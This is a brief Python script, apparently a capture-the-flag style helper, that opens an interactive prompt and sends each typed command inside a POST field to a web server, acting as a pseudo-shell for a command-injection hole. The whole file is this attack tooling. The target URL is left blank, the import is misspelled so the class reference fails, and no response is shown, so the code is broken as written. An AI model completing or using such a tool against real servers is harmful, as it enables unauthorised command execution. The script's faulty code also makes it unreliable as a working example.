#!/usr/bin/python3
import requests
from cmd import cmd

class Terminal(Cmd):
  prompt = '> '

  def default(self, args):
    RunCmd(args)

def RunCmd(cmd):
  data = {'property' : f'string {cmd}'}
  req = requests.post('http://', data=data)

term = Terminal()
term.cmdloop()
